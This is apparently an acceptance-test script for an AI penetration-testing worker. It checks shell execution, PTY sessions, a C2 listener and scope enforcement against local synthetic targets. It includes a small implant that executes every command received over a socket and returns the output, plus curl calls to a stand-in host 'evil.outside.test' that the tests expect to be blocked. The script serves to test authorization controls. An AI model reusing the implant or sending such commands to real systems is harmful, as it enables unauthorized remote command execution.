/**
 * shell / 后台作业 / PTY 会话 / C2 的端到端验收（本地合成目标，不触外网）。
 *
 * 跑法：pnpm tsx scripts/shell-c2-acceptance.ts
 * 产物：临时目录下的 evidence/exec/*；终端输出 PASS 行与末尾 JSON 摘要。
 */
import { execSync } from "node:child_process";
import { connect, type Socket } from "node:net";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openHistory } from "@gongyuai/history";
import type { WorkerManifest } from "@gongyuai/contracts";
import { c2Tool, shellJob, shellSession } from "../packages/worker/src/exec-tools.js";
import { closeExecRuntime } from "../packages/worker/src/exec-runtime.js";
import { runShell, type ToolContext } from "../packages/worker/src/tools.js";

const root = mkdtempSync(join(tmpdir(), "gy-shell-c2-"));
const evidenceDir = join(root, "evidence");
const workspaceDir = join(root, "workspace");
mkdirSync(evidenceDir, { recursive: true });
mkdirSync(workspaceDir, { recursive: true });

const manifest: WorkerManifest = {
  taskId: "7f0d4c22-1111-4222-8333-444455556666",
  dataDir: root,
  historyDb: join(root, "history.sqlite"),
  durableDb: join(root, "durable.sqlite"),
  evidenceDir,
  workspaceDir,
  auth: {
    authorizationNote: "本地合成目标验收：127.0.0.1 与 10.10.0.0/16 内实验机",
    targets: ["127.0.0.1", "10.10.0.0/16"],
    outOfScope: [],
    capability: "active-lab",
  },
  scopeVersion: 1,
  goals: [],
  budget: { maxTokens: 100_000, maxWallMs: 600_000, maxToolCalls: 200, maxInstalls: 10, relayTokenThreshold: 30_000, relayMinToolCalls: 2 },
  execution: { maxConcurrentExplores: 1, maxIntentsPerReason: 4, maxIntentsPerAssetRoot: 2, exploreTimeoutMs: 900_000, reasonLeaseMs: 120_000 },
  workerId: "acc",
  workerSlot: 0,
  workerCount: 1,
  commandConfirmation: "auto",
  mock: false,
  mcpServers: [],
  mcpPool: [],
  mcpCatalog: [],
  skillPacks: [],
  skillPool: [],
  skillCatalog: [],
  assetCollectors: [],
};

const history = openHistory({ dbPath: join(root, "history.sqlite"), evidenceDir });
const ctx: ToolContext = { manifest, history, usage: { toolCalls: 0, installs: 0 } };
const results: Array<{ name: string; ok: boolean; detail: string }> = [];

function check(name: string, ok: boolean, detail: string): void {
  results.push({ name, ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"} ${name} — ${detail}`);
}

async function main() {
  // 1) 前台真实命令（不再是 printf/pwd 白名单桩）
  const shell = await runShell(ctx, "printf 'shell-ok\\n'");
  check("runShell 执行真实命令", shell.stdout === "shell-ok\n" && shell.exitCode === 0, `exit=${shell.exitCode} stdout=${JSON.stringify(shell.stdout)}`);

  // 2) 越界命令被授权闸拒绝
  let denied = "";
  try {
    await runShell(ctx, "curl -s http://evil.outside.test/");
  } catch (err) {
    denied = err instanceof Error ? err.message : String(err);
  }
  check("越界命令被拒绝", /not in auth\.targets|越界/.test(denied), denied || "未被拒绝");

  // 3) 后台作业活过一次工具调用
  const start = JSON.parse(await shellJob(ctx, { action: "start", command: "for i in 1 2 3; do echo tick$i; sleep 0.2; done", label: "acceptance-job" })) as { job?: { id: string } };
  const jobId = start.job?.id ?? "";
  const waited = JSON.parse(await shellJob(ctx, { action: "wait", jobId, waitMs: 10_000 })) as { status: string; exitCode: number; stdout: string };
  check("后台作业跑完并回收输出", waited.status === "exited" && waited.exitCode === 0 && waited.stdout.includes("tick3"), JSON.stringify(waited).slice(0, 200));

  // 4) PTY 会话可持续输入
  const opened = JSON.parse(await shellSession(ctx, { action: "open" })) as { session?: { id: string } };
  const sid = opened.session?.id ?? "";
  await shellSession(ctx, { action: "write", sessionId: sid, data: "echo pty-ok" });
  const read = JSON.parse(await shellSession(ctx, { action: "wait", sessionId: sid, pattern: "pty-ok", waitMs: 10_000 })) as { matched: boolean; data: string };
  check("PTY 会话写入并读到回显", read.matched, `tail=${read.data.slice(-120)}`);
  await shellSession(ctx, { action: "close", sessionId: sid });

  // 5) C2：监听 → 合成 raw implant → 派任务 → 回收 → 越界拒绝
  const listened = JSON.parse(await c2Tool(ctx, { action: "listen", bindHost: "127.0.0.1", bindPort: 0 })) as { listener?: { id: string; bindPort: number } };
  const listener = listened.listener;
  let implant: Socket | null = null;
  try {
    if (!listener) throw new Error("监听器启动失败");
    await new Promise<void>((resolve, reject) => {
      const socket = connect({ host: "127.0.0.1", port: listener.bindPort }, () => resolve());
      implant = socket;
      socket.on("error", reject);
      socket.write("ready\n");
      socket.on("data", (chunk: Buffer) => {
        for (const line of chunk.toString("utf8").split("\n")) {
          if (!line.trim()) continue;
          try {
            socket.write(execSync(line, { encoding: "utf8", timeout: 5_000 }));
          } catch (err) {
            socket.write(`ERR ${(err as Error).message}\n`);
          }
        }
      });
    });
    await new Promise((r) => setTimeout(r, 400));
    const sessions = JSON.parse(await c2Tool(ctx, { action: "sessions" })) as { sessions: Array<{ id: string; allowed: boolean; kind: string }> };
    const session = sessions.sessions[0];
    check("C2 会话登记且通过范围校验", !!session && session.allowed, JSON.stringify(sessions.sessions));
    if (!session) throw new Error("没有会话");
    const task = JSON.parse(await c2Tool(ctx, { action: "task", sessionId: session.id, command: "id -un", waitMs: 8_000 })) as { ok: boolean; task?: { result: string; status: string } };
    check("C2 任务执行并回收输出", task.ok && /^[a-z0-9_.-]+$/i.test((task.task?.result ?? "").trim()), JSON.stringify(task).slice(0, 200));
    const blocked = JSON.parse(await c2Tool(ctx, { action: "task", sessionId: session.id, command: "curl http://evil.outside.test/", waitMs: 2_000 })) as { ok: boolean; error?: string };
    check("C2 越界任务被拒", blocked.ok === false && /越界|not in auth/.test(blocked.error ?? ""), blocked.error ?? "");
    await c2Tool(ctx, { action: "close-listener", listenerId: listener.id });
  } finally {
    implant?.destroy();
  }

  // 6) 证据落盘
  const execEvidence = readdirSync(join(evidenceDir, "exec"));
  check("执行证据落盘", execEvidence.length >= 3, execEvidence.join(", "));
  const bodies = execEvidence.map((name) => readFileSync(join(evidenceDir, "exec", name), "utf8"));
  const cmdBody = bodies.find((body) => /退出码/.test(body)) ?? "";
  check("证据含命令与退出码", /退出码/.test(cmdBody) && /shell-ok/.test(cmdBody), cmdBody.split("\n")[0] ?? "");

  closeExecRuntime();
  history.close();
  const failed = results.filter((r) => !r.ok);
  console.log("\n" + JSON.stringify({ root, total: results.length, failed: failed.length, results }, null, 2));
  if (failed.length) process.exitCode = 1;
}

main().catch((err) => {
  console.error("acceptance crashed:", err);
  closeExecRuntime();
  history.close();
  process.exitCode = 1;
});
